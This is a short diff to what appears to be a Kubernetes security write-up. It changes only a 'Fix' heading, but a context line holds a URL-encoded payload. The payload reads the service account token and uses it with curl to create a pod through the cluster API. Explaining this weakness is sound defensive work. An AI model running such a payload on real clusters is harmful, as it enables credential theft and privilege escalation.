@@ -189,6 +189,8 @@ encoded
 KUBE_TOKEN%3D%60cat%20%2Fvar%2Frun%2Fsecrets%2Fkubernetes.io%2Fserviceaccount%2Ftoken%60%3B%0Acurl%20-k%20-v%20-X%20POST%20-H%20%22Authorization%3A%20Bearer%20%24KUBE_TOKEN%22%20-H%20%22Content-Type%3A%20application%2Fjson%22%20https%3A%2F%2F%24KUBERNETES_SERVICE_HOST%3A%24KUBERNETES_PORT_443_TCP_PORT%2Fapi%2Fv1%2Fnamespaces%2Fdefault%2Fpods%20-d%40bad-pod.json
 ```
 </details>
-## Fix
+
+
+### Fix
 
 To fix this problem one should set the role permissions when defining the cluster role; Simple yet dangerous;  
